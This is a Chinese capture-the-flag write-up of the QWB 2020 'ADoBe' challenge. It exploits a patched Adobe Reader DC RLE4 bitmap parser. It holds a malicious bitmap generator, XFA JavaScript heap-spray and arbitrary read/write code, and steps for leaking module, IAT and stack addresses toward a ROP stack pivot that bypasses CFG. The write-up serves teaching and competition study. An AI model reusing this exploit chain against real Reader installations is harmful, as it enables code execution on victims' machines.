> 原文链接: https://www.anquanke.com//post/id/222391 


# 强网杯2020决赛RealWord题ADoBe（ADB）


                                阅读量   
                                **212080**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t019d988ec48fd81802.png)](https://p3.ssl.qhimg.com/t019d988ec48fd81802.png)



## 0x00 前言

第一次来强网杯线下，接触了realword题，收获很大，深有感触

**题目信息：**

**题目名称：**ADoBe

**旗帜名称：**ADB

**题目描述：**附件中给出了一个Adobe Reader DC可执行程序，请挖掘并利用该程序中的漏洞，在靶机中弹出计算器程序。

靶机环境：Win10 虚拟机，默认安装配置，系统补丁安装至最新。系统安装了附件中提供中的Adobe Reader DC程序，并已关闭程序沙箱。

**附件信息：**Adobe Reader DC程序及相关Dll文件，版本均与靶机中的一致。

展示环境拓扑：交换机连接选手攻击机和展示机，展示机使用VMware（最新版）运行靶机，靶机通过NAT方式连接到网络。

展示过程：选手携带自己的攻击机上台展示题解，攻击机需运行HTTP服务，供操作员下载能够利用程序漏洞的PDF文档。操作员打开PDF文档后，在规定的时间内，在靶机中弹出计算器程序判定为题解正确。

**注意事项：**

（1）在解题时，可通过在注册表项<br>
HKLM\SOFTWARE\Wow6432Node\Policies\Adobe\Acrobat Reader\DC\FeatureLockDown中修改键值项bProtectedMode（DWORD类型），赋值为0来关闭Adobe Reader DC程序的沙箱；

（2）上台展示题解的时候注意关闭exp的调试信息。



## 0x01 挖掘过程

从题目描述可以看出，这是要让我们对这个patch过的adobe reader软件进行漏洞挖掘，为了找出漏洞点，我们需要下载与当前版本一致的官方版本进行对比。

[![](https://p5.ssl.qhimg.com/t016baaf7dab228236d.png)](https://p5.ssl.qhimg.com/t016baaf7dab228236d.png)

将官方版本下载安装后，我们写一个脚本来查找到底是哪一个文件被patch过，脚本如下，就是简单的内容比对。

```
#coding:utf8
import os

src_dir = u'C:\\Users\\Administrator\\Desktop\\realword\\Adobe附件\\Adobe\\Acrobat Reader DC' # 源文件目录地址

comp_dest = u'C:\\Program Files (x86)\\Adobe\Acrobat Reader DC'

def list_all_files(rootdir):
_files = []

#列出文件夹下所有的目录与文件
list_file = os.listdir(rootdir)

for i in range(0,len(list_file)):

# 构造路径
path = os.path.join(rootdir,list_file[i])

# 判断路径是否是一个文件目录或者文件
# 如果是文件目录，继续递归

if os.path.isdir(path):
_files.extend(list_all_files(path))
if os.path.isfile(path):
_files.append(path)
return _files

files = list_all_files(src_dir)
for path in files:
path2 = comp_dest + '\\' + path[len(src_dir)+1:]
#print path2
f = open(path,'rb')
content1 = f.read()
f.close()
try:
f = open(path2,'rb')
content2 = f.read()
f.close()
except:
continue
if content1 != content2:
print path
```

经过比对，发现仅一个文件被修改过，那就是Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api文件，接下来，利用Fairdell HexCmp2差异对比工具来对比AcroForm.api与官方文件的差异之处。结果如下

```
Different between:
First file: "C:\Users\Administrator\Desktop\AcroForm.api"
Second file: "C:\Users\Administrator\Desktop\AcroForm_patched.api"
Shift: 0
------------------------------------------------------------------------

First file: "C:\Users\Administrator\Desktop\AcroForm.api"
Second file: "C:\Users\Administrator\Desktop\AcroForm_patched.api"
Shift: 0
Shift: 0
------------------------------------------------------------------------

000001E0 | 68 F0 E2 30 1E | 000001E0 | 00 00 00 00 00 |
------------------------------------------------------------------------
0054B098 | 87 | 0054B098 | 8F |
------------------------------------------------------------------------
0054B0C0 | EE | 0054B0C0 | FE |
------------------------------------------------------------------------
```

打开IDA分析，跳转到差异地址处，发现指令由**无符号指令patch成了有符号指令**

[![](https://p1.ssl.qhimg.com/t019eca1a3b6860a359.png)](https://p1.ssl.qhimg.com/t019eca1a3b6860a359.png)

这题patch后的漏洞类型与腾讯安全玄武实验室分析CVE-2019-8014类似，甚至可以说，本题比CVE-2019-8014的利用更加简单方便，首先阅读腾讯实验室的文章，可以发现CVE-2019-8014的堆溢出写数据，不能做到很精准的控制，如果要向前溢出修改ArrayBuffer的byteLength时，那么从byteLength处到溢出堆的起始点都会被覆盖为同一个数据，也就是ArrayBuffer的DataView指针也会被覆盖，进程使用ArrayBuffer对象时会因为其DataView指针指向一个无效地址而崩溃，因此该利用需要事先在对应位置布置好fake DataView堆布局。

### <a class="reference-link" name="ArrayBuffer"></a>ArrayBuffer

ArrayBuffer是JavaScript里的一种类，可以理解为是一个字节数组的包装类，如果要对ArrayBuufer的内存进行读写，就需要建立DataView对象来进行操作。在Adobe中，使用的JS引擎为SpiderMonkey，在早期的Adobe Reader中，其JS的版本不支持ArrayBuffer这个类，好在这是最新版的Adobe Reader，其ArrayBuffer类的大致结构如下

```
class ArrayBuffer `{`
 public:
  uint32_t flags;               // flags
  uint32_t byteLength;   // 数组长度
  uint32_t dataview_obj;            // dataview 对象指针
  uint32_t length;              //
 // ...
 //数据区
`}`;
```

### <a class="reference-link" name="%E7%BB%93%E5%90%88JS%E8%BE%BE%E5%88%B0%E5%88%A9%E7%94%A8"></a>结合JS达到利用

由于Adobe Reader本身支持JavaScript，我们希望利用堆溢出**修改ArrayBuffer的byteLength为0xFFFFFFFF**，从而使得该ArrayBuffer具有任意地址读写的能力，然后可以利用JavaScript对内存进行读写，劫持程序流；为了达到这个目的，首先我们得利用堆喷构造好堆布局如下

[![](https://p5.ssl.qhimg.com/t01e632f768d5101d2d.png)](https://p5.ssl.qhimg.com/t01e632f768d5101d2d.png)

我们希望在Adobe Reader解析bitmap之前时，ArrayBuffer对象后方能间隔的出现一些已经释放了的堆（“空洞”），这样解析bitmap时，存放bitmap的解压数据的堆(line)正好落到空洞里，然后通过bitmap解析时的堆溢出，向前方溢出，修改ArrayBuffer里的byteLength。

### <a class="reference-link" name="%E7%B2%BE%E5%87%86%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98"></a>精准控制内存

首先，xpos是完全可以通过伪造bitmap，使得其值累加到0xFFFFFFFF，由于这里xpos是有符号数，因此右移1位的操作，其符号位不变，仍然可以保持为负数，正是因为其符号能保持为负数，我们可以精准的向上方溢出。

[![](https://p2.ssl.qhimg.com/t011205661b71b7f054.png)](https://p2.ssl.qhimg.com/t011205661b71b7f054.png)

为了确定溢出的距离，我们使用动态调试，这里，我们选择堆喷的大小为0x140，因此，我们事先new ArrayBuffer(0x130)，然后间隔的释放一些ArrayBuffer对象。在Adobe Reader的pdf文档里，我们可以在xdp标签里嵌入

```
&lt;event activity="initialize" name="event__initialize"&gt;
        &lt;script contentType="application/x-javascript"&gt;
        &lt;/script&gt;
&lt;/event&gt;
```

该标签里的脚本会在Adobe Reader打开pdf文件开始时执行，也就是在解析bitmap之前执行，因此，我们可以在这里进行堆喷布局，pdf模板内xdp标签内的关键内容如下

```
&lt;variables&gt;
         &lt;script name="spray" contentType="application/x-javascript"&gt;
            //全局变量
            var size = 200;
            var array = new Array(size);
         &lt;/script&gt;
         &lt;?templateDesigner expand 1?&gt;
      &lt;/variables&gt;
      &lt;event activity="initialize" name="event__initialize"&gt;
        &lt;script contentType="application/x-javascript"&gt;
           // 在漏洞触发之前，我们布局好堆布局
           function fillHeap() `{`
               var i;
               var j;
               spray.array[0] = new ArrayBuffer(0x130);
               //var dv = new DataView(spray.array[0]);
               // dv.setUint32(0, 0x66666666, true);
               //dv = null;
               for (i = 0; i &amp;lt; spray.array.length; ++i) `{`
                  spray.array[i] = spray.array[0].slice();
                  //spray.array[i] = new ArrayBuffer(0x130);
                  //var dv = new DataView(spray.array[i]);
                  //dv.setUint32(0,i, true);
               `}`
               for (j = 0; j &amp;lt; 0x1000; j++) `{`
                  for (i = spray.size - 1; i &amp;gt; spray.size / 4; i -= 10) `{`
                     spray.array[i] = null;
                  `}`
               `}`
           `}`
           fillHeap();
           app.alert("[!] ready to go");
        &lt;/script&gt;
      &lt;/event&gt;
```

堆布局配置好了，接着我们分析一下程序如何才能到达漏洞点进而溢出

```
unsigned int __thiscall sub_20D4B4AF(_DWORD *this)
`{`
  _DWORD *v1; // edi
  int v2; // ecx
  bool v3; // zf
  int v4; // eax
  unsigned int v5; // esi
  int v6; // eax
  int v7; // ecx
  int v8; // ecx
  unsigned __int16 v9; // ax
  int v10; // edx
  unsigned int v11; // esi
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  int v15; // ecx
  int v16; // ecx
  _DWORD *v17; // ecx
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  double v21; // xmm1_8
  double v22; // xmm4_8
  __int16 v23; // cx
  unsigned int height; // ebx
  unsigned int result; // eax
  unsigned int v26; // esi
  int v27; // ecx
  int v28; // eax
  int v29; // ecx
  int v30; // eax
  int v31; // ecx
  unsigned int v32; // ebx
  int v33; // eax
  int v34; // ecx
  int v35; // eax
  int v36; // ecx
  int v37; // ecx
  unsigned int v38; // esi
  int v39; // ecx
  unsigned int v40; // edx
  char v41; // ah
  unsigned int v42; // ecx
  int v43; // ebx
  int v44; // ecx
  int v45; // eax
  unsigned int v46; // edx
  int v47; // ecx
  int v48; // ecx
  int v49; // ecx
  unsigned int v50; // eax
  int v51; // ebx
  int v52; // eax
  bool v53; // zf
  int v54; // ecx
  unsigned int xpos; // esi
  int v56; // ecx
  char v57; // ah
  int v58; // edx
  unsigned int v59; // ecx
  unsigned int v60; // esi
  unsigned int v61; // ebx
  char v62; // si
  int v63; // eax
  int v64; // ecx
  unsigned int v65; // esi
  _DWORD *v66; // ecx
  char v67; // bl
  int v68; // eax
  char v69; // cl
  bool v70; // cf
  int v71; // ecx
  int v72; // ecx
  int v73; // ecx
  signed int v74; // ebx
  int ypos_1; // eax
  unsigned int dst_xpos; // ecx
  signed int xpos_; // ebx
  char index; // cl
  signed int byte_slot; // esi
  int odd_index; // edx
  _DWORD *v81; // ecx
  unsigned __int8 _4bits; // bl
  int line; // eax
  unsigned __int8 _4bits_1; // cl
  int v85; // edx
  unsigned int v86; // esi
  int v87; // ebx
  int v88; // eax
  int v89; // ecx
  int v90; // esi
  int v91; // ecx
  int v92; // ecx
  int v93; // ecx
  unsigned int v94; // ebx
  unsigned int v95; // ebx
  int v96; // eax
  int v97; // ecx
  int v98; // esi
  int v99; // ecx
  int v100; // ecx
  int v101; // ecx
  signed int v102; // [esp-4h] [ebp-7Ch]
  signed int v103; // [esp-4h] [ebp-7Ch]
  int v104; // [esp-4h] [ebp-7Ch]
  char v105; // [esp+10h] [ebp-68h]
  void **v106; // [esp+2Ch] [ebp-4Ch]
  int v107; // [esp+34h] [ebp-44h]
  int v108; // [esp+38h] [ebp-40h]
  int v109; // [esp+3Ch] [ebp-3Ch]
  char v110; // [esp+44h] [ebp-34h]
  int width_1; // [esp+48h] [ebp-30h]
  int v112; // [esp+4Ch] [ebp-2Ch]
  __int16 v113; // [esp+50h] [ebp-28h]
  unsigned __int16 bit_count; // [esp+52h] [ebp-26h]
  unsigned int biCompression; // [esp+54h] [ebp-24h]
  int v116; // [esp+5Ch] [ebp-1Ch]
  int v117; // [esp+60h] [ebp-18h]
  unsigned int v118; // [esp+64h] [ebp-14h]
  int v119; // [esp+74h] [ebp-4h]
  char v120; // [esp+78h] [ebp+0h]
  void **v121; // [esp+7Ch] [ebp+4h]
  int v122; // [esp+84h] [ebp+Ch]
  int v123; // [esp+88h] [ebp+10h]
  int v124; // [esp+8Ch] [ebp+14h]
  unsigned int v125; // [esp+94h] [ebp+1Ch]
  unsigned __int8 xdelta; // [esp+9Bh] [ebp+23h]
  int cmd; // [esp+9Ch] [ebp+24h]
  char v128; // [esp+A3h] [ebp+2Bh]
  int v129; // [esp+A4h] [ebp+2Ch]
  __int16 ydelta; // [esp+A8h] [ebp+30h]
  unsigned int width; // [esp+ACh] [ebp+34h]
  unsigned __int8 v132; // [esp+B3h] [ebp+3Bh]
  unsigned int bitmap_ends; // [esp+B4h] [ebp+3Ch]
  unsigned int v134; // [esp+B8h] [ebp+40h]
  char v135; // [esp+BFh] [ebp+47h]
  unsigned int v136; // [esp+C0h] [ebp+48h]
  unsigned __int8 low_4bits; // [esp+C6h] [ebp+4Eh]
  unsigned __int8 high_4bits; // [esp+C7h] [ebp+4Fh]
  unsigned int ypos; // [esp+C8h] [ebp+50h]
  char v140; // [esp+CCh] [ebp+54h]

  v1 = this;
  if ( !this[2] )
    _Mtx_lock_2(16479);
  fn_read_bytes(&amp;v140, 14);
  sub_20D4AFFB(&amp;v110);
  v2 = v1[2];
  fn_read_bytes(&amp;v110, 40);
  if ( v113 != 1 )
    goto LABEL_175;
  width = 4;
  if ( bit_count == 1 )
    goto LABEL_9;
  if ( bit_count == 4 )
  `{`
    if ( !biCompression )
      goto LABEL_11;
    v3 = biCompression == 2;
    goto LABEL_10;
  `}`
  if ( bit_count != 8 )
  `{`
    if ( bit_count != 24 )
    `{`
LABEL_8:
      sub_20E0D4B3(&amp;v120, 17996, 0);
      goto LABEL_176;
    `}`
LABEL_9:
    v3 = biCompression == 0;
    goto LABEL_10;
  `}`
  if ( !biCompression )
    goto LABEL_11;
  v3 = biCompression == 1;
LABEL_10:
  if ( !v3 )
    goto LABEL_8;
LABEL_11:
  v4 = bit_count * width_1;
  if ( v4 &lt;= 0 || v4 &lt; width_1 || v4 &lt; bit_count )
  `{`
    sub_20E0D4B3(&amp;v120, 16479, 0);
    goto LABEL_176;
  `}`
..................................................................
    if ( biCompression == 2 )
    `{`
      v54 = v1[2];
      xpos = 0;
      ypos = v112 - 1;
      bitmap_ends = 0;
      v136 = 0;
      result = fn_feof(v54, v10);
      if ( !result )
      `{`
        while ( 1 )
        `{`
          if ( bitmap_ends )
            return result;
          v56 = v1[2];
          fn_read_bytes(&amp;cmd, 2);
          v57 = BYTE1(cmd);
          if ( (_BYTE)cmd )
            break;
          v58 = BYTE1(cmd);
          if ( BYTE1(cmd) )
          `{`
            if ( BYTE1(cmd) == 1 )
            `{`
              v74 = 1;
              bitmap_ends = 1;
              goto LABEL_152;
            `}`
            if ( BYTE1(cmd) != 2 )
            `{`
              v59 = ypos;
              v60 = BYTE1(cmd) + xpos;
              if ( ypos &gt;= height )
                goto LABEL_175;
              v61 = v136;
              if ( v60 &lt; v136 || v60 &lt; BYTE1(cmd) || v60 &gt; width )
                goto LABEL_175;
              v62 = 0;
              v134 = 0;
              if ( BYTE1(cmd) )
              `{`
                do
                `{`
                  v63 = v62 &amp; 1;
                  v125 = v62 &amp; 1;
                  if ( !(v62 &amp; 1) )
                  `{`
                    v64 = v1[2];
                    fn_read_bytes(&amp;v132, 1);
                    v128 = v132 &amp; 0xF;
                    v59 = ypos;
                    v135 = v132 &gt;&gt; 4;
                    v63 = v125;
                  `}`
                  v65 = v61 &gt;&gt; 1;
                  v104 = v59;
                  v66 = (_DWORD *)v1[3];
                  if ( v61 &amp; 1 )
                  `{`
                    if ( v63 )
                    `{`
                      v68 = fn_get_scanline(v66, v104);
                      v69 = v128;
                    `}`
                    else
                    `{`
                      v68 = fn_get_scanline(v66, v104);
                      v69 = v135;
                    `}`
                    *(_BYTE *)(v65 + v68) |= v69;
                  `}`
                  else
                  `{`
                    v67 = v135;
                    if ( v63 )
                      v67 = v128;
                    *(_BYTE *)(fn_get_scanline(v66, v104) + v65) = 16 * v67;
                    v61 = v136;
                  `}`
                  ++v61;
                  v57 = BYTE1(cmd);
                  v62 = v134 + 1;
                  v70 = v134 + 1 &lt; BYTE1(cmd);
                  v136 = v61;
                  v59 = ypos;
                  ++v134;
                `}`
                while ( v70 );
              `}`
              if ( (v57 &amp; 3u) - 1 &lt;= 1 )
              `{`
                v71 = v1[2];
                fn_read_bytes(&amp;v132, 1);
              `}`
LABEL_150:
              xpos = v136;
              goto LABEL_151;
            `}`
            v72 = v1[2];
            fn_read_bytes(&amp;xdelta, 1);
            v73 = v1[2];
            fn_read_bytes((char *)&amp;ydelta + 1, 1);
            xpos += xdelta;
            ypos -= HIBYTE(ydelta);
            v136 = xpos;
          `}`
          else
          `{`
            --ypos;
            xpos = 0;
            v136 = 0;
          `}`
LABEL_151:
          v74 = bitmap_ends;
LABEL_152:
          result = fn_feof(v1[2], v58);
          if ( result )
          `{`
            v53 = v74 == 0;
            goto LABEL_106;
          `}`
          height = v129;
        `}`
        v58 = (unsigned __int8)cmd;
        high_4bits = BYTE1(cmd) &gt;&gt; 4;
        ypos_1 = ypos;
        low_4bits = BYTE1(cmd) &amp; 0xF;
        dst_xpos = (unsigned __int8)cmd + xpos;
        if ( ypos &gt;= height )
          goto LABEL_175;
        if ( (signed int)dst_xpos &gt; (signed int)width )
          goto LABEL_175;
        xpos_ = v136;
        if ( dst_xpos &lt; v136 || dst_xpos &lt; (unsigned __int8)cmd )
          goto LABEL_175;
        index = 0;
        v134 = 0;
        if ( (_BYTE)cmd )
        `{`
          do
          `{`
            byte_slot = xpos_ &gt;&gt; 1;
            odd_index = index &amp; 1;
            v81 = (_DWORD *)v1[3];
            if ( xpos_ &amp; 1 )
            `{`
              if ( odd_index )
              `{`
                line = fn_get_scanline(v81, ypos_1);
                _4bits_1 = low_4bits;
              `}`
              else
              `{`
                line = fn_get_scanline(v81, ypos_1);
                _4bits_1 = high_4bits;
              `}`
              *(_BYTE *)(byte_slot + line) |= _4bits_1;
            `}`
            else
            `{`
              _4bits = high_4bits;
              if ( odd_index )
                _4bits = low_4bits;
              *(_BYTE *)(fn_get_scanline(v81, ypos_1) + byte_slot) = 16 * _4bits;
              xpos_ = v136;
            `}`
            ++xpos_;
            index = v134 + 1;
            v70 = v134 + 1 &lt; (unsigned __int8)cmd;
            v136 = xpos_;
            ypos_1 = ypos;
            ++v134;
          `}`
          while ( v70 );
        `}`
        goto LABEL_150;
      `}`
    `}`
LABEL_175:
    sub_20E0D4B3(&amp;v120, 17993, 0);
LABEL_176:
    CxxThrowException(&amp;v120, &amp;_TI2_AVjfExFull__);
  `}`
```

从中可以分析出COMPRESSION=2，BIT_COUNT = 4，这样即当bitmap使用的是REL4压缩算法时，就可以到达漏洞处，接下来分析该bitmap的width和height应该为多少，才能够使得申请的堆落到ArrayBuffer对象之间的堆空洞里，在此处用windbg下断点进行调试

[![](https://p0.ssl.qhimg.com/t0130b808993e1892bb.png)](https://p0.ssl.qhimg.com/t0130b808993e1892bb.png)

首先windbg断点，当AcroForm.api模块被加载时会断下

```
sxe ld:AcroForm.api
```

然后断点

```
bp 0x54bcc8+AcroForm_base
```

call调用的是fn_get_scanline函数，返回的是一个堆地址

[![](https://p2.ssl.qhimg.com/t0162f175c84f9d2973.png)](https://p2.ssl.qhimg.com/t0162f175c84f9d2973.png)

我们查看这个堆的头部以及附近的内容，可以发现其前方0x144处，正是ArrayBuffer的byteLength变量，可见这里，我们堆喷成功，bitmap的解压缩数据堆成功申请到hole里

[![](https://p3.ssl.qhimg.com/t011f60bcb8f5f89d29.png)](https://p3.ssl.qhimg.com/t011f60bcb8f5f89d29.png)

此时我们bitmap的WIDTH = 0x278，HEIGHT = 1，该bitmap的数据解压区正好申请到hole里。<br>
并且通过调试，我们确定了溢出的距离为`-0x144`，无符号数也就是`0xfffffebc`,即bye_slot应该为0xfffffebc

[![](https://p5.ssl.qhimg.com/t012b532259a5d8beda.png)](https://p5.ssl.qhimg.com/t012b532259a5d8beda.png)

由于这里xpos** &gt;&gt; 1是一个有符号数的运算，因此xpos**的值应该为`0xfffffd78`

```
#include &lt;stdio.h&gt;
#include &lt;iostream&gt;

using namespace std;

int main() `{`
    int a = 0xfffffebc;
    cout &lt;&lt; hex &lt;&lt; (a &lt;&lt; 1) &lt;&lt; endl;
`}`
```

而xpos是可以控制的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c19e4a3df315f052.png)

于是，我们可以向-0x144的位置写上4字节0xFF，使得ArrayBuffer的byteLength为0xFFFFFFFF

gen_bitmap.py

```
#-*- coding:utf-8 -*-
import os
import sys
import struct

RLE8 = 1
RLE4 = 2
COMPRESSION = RLE4
BIT_COUNT = 4
CLR_USED = 1 &lt;&lt; BIT_COUNT
WIDTH = 0x278
HEIGHT = 1

def get_bitmap_file_header(file_size, bits_offset):
    return struct.pack('&lt;2sIHHI', 'BM', file_size, 0, 0, bits_offset)

def get_bitmap_info_header(data_size):
    return struct.pack('&lt;IIIHHIIIIII',
        0x00000028,
        WIDTH,
        HEIGHT,
        0x0001,
        BIT_COUNT,
        COMPRESSION,
        data_size,
        0x00000000,
        0x00000000,
        CLR_USED,
        0x00000000)

def get_bitmap_info_colors():
    # B, G, R, Reserved
    rgb_quad = '\x00\x00\xFF\x00'
    return rgb_quad * CLR_USED

def get_bitmap_data():

    # set xpos to 0xFFFFFD02
    data = '\x00\x02\xFF\x00' * (0xFFFFFD02 / 0xFF)
    # set xpos to 0xFFFFFD78
    data += '\x00\x02\x76\x00'

    # 0x4 bytes of 0xFF
    data += '\x08\xFF'

    # mark end of bitmap to skip CxxThrowException
    data += '\x00\x01'

    return data

def generate_bitmap(filepath):
    data = get_bitmap_data()
    data_size = len(data)

    bmi_header = get_bitmap_info_header(data_size)
    bmi_colors = get_bitmap_info_colors()

    bmf_header_size = 0x0E
    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)
    file_size = bits_offset + data_size
    bmf_header = get_bitmap_file_header(file_size, bits_offset)
    with open(filepath, 'wb') as f:
        f.write(bmf_header)
        f.write(bmi_header)
        f.write(bmi_colors)
        f.write(data)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage: %s &lt;output.bmp&gt;' % os.path.basename(sys.argv[0])
        sys.exit(1)
    generate_bitmap(sys.argv[1])
```

当完成了这一步的修改以后，我们就已经拥有了一个具有任意地址读写的ArrayBuffer对象了，与前面的堆喷布局同理，在pdf的xdp标签里嵌入

```
&lt;event activity="docReady" ref="$host" name="event__docReady"&gt;
        &lt;script contentType="application/x-javascript"&gt;
        &lt;/script&gt;
      &lt;/event&gt;
```

可以实现图片解析完成以后的后续操作，我们在这里，首先要查找到那个具有任意地址读写的ArrayBuffer对象，由于SpiderMonkey引擎的性质，我们可以在内存里搜索0xf0e0d0c0这个特殊数据，从而能计算出ArrayBuffer对象本身的地址，以便实现后续的读写利用

```
// 漏洞触发后，我们找到那个byteLength被修改为-1的那个ArrayBuffer，通过此ArrayBuffer，可以实现任意地址读写。
           for (var i = 0; i &amp;lt; spray.array.length; ++i) `{`
              if (spray.array[i] != null &amp;amp;&amp;amp; spray.array[i].byteLength == -1) `{`
                 //app.alert("found idx=" + i);
                 var dv = new DataView(spray.array[i]);
                 for (var j=-100;;j-=4) `{` //搜索内存，查找堆地址
                    var x = dv.getUint32(j,true);
                    if (x == 0xf0e0d0c0) `{`
                       //得到ArrayBuffer自身的地址
                       var heap_addr = dv.getUint32(j + 0xC,true) - 0x10 - j;
                       //app.alert("heap_addr=" + heap_addr.toString(16));
                       //得到dataview的地址
                       var dataview_obj_addr = dv.getUint32(-8,true);
                       app.alert("dataview_obj=" + dataview_obj_addr.toString(16));
                       //得到EScript.api模块的地址
                       var escript_base = dv.getUint32(dataview_obj_addr + 0xC - heap_addr,true) - 0x275510;
                       //app.alert("escript_base=" + escript_base.toString(16));
                       //计算三个重要的函数的iat表
                       var LoadLibraryA_iat = escript_base + 0x1af0d8;
                       var GetProcAddress_iat = escript_base + 0x1af114;
                       var VirtualProtect_iat = escript_base + 0x1af058;
                       //泄露函数地址
                       var LoadLibraryA = dv.getUint32(LoadLibraryA_iat - heap_addr,true);
                       var GetProcAddress = dv.getUint32(GetProcAddress_iat - heap_addr,true);
                       var VirtualProtect = dv.getUint32(VirtualProtect_iat - heap_addr,true);
                    `}`
                 `}`
              `}`
           `}`
```

接下来是劫持程序流，通过尝试发现程序开启了CFG控制流保护机制

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01dd24c937ba1ffafd.png)

因此劫持虚表为gadget不可用，绕过方法有一些，这里我直接选择劫持栈做ROP。那么得泄露栈地址，在windows下泄露栈地址不太容易，得确定teb、peb的地址，而我这里盲摸索出针对当前Adobe Reader的栈地址搜索方法，即通过dataview对象里的一连串指针，偶然发现一个接近栈地址值的指针，其位置如下

```
var tmp = dv.getUint32(dataview_obj_addr - heap_addr,true);
tmp = dv.getUint32(tmp - heap_addr,true);
tmp = dv.getUint32(tmp + 0xC - heap_addr,true);
//得到一个栈地址
var s = dv.getUint32(tmp + 0x8 - heap_addr,true);
```

这里得到的s是一个栈地址，但是其地址与函数ret时的esp之间的偏移是会发生变化的，但是变化范围不大，因此可以以该地址为起点进行搜索，直到搜索到getUint32的返回地址时便可以确定具体的栈地址。

```
//搜索栈地址，确定一个稳定的栈地址
 var stack_addr = 0;
 for (var k = s;k &amp;gt; s - 0x1000;k -= 4) `{`
        x = dv.getUint32(k - heap_addr,true);
         if (x == escript_base + 0x12e384) `{`
            stack_addr = k;
             //app.alert("found stack_addr=" + stack_addr.toString(16));
            break;
        `}`
`}`
```

接下来就利用任意地址读写，劫持ret时的esp指向的地址处为pop esp ; ret，做栈迁移，可以dv.setFloat64来完成一次性写8字节的目的，这样写完便可以完成栈迁移。



## 0x02 感想

第一次挖掘真实漏洞，收获挺大



## 0x03 参考

(深入分析Adobe忽略了6年的PDF漏洞) [https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/](https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/)
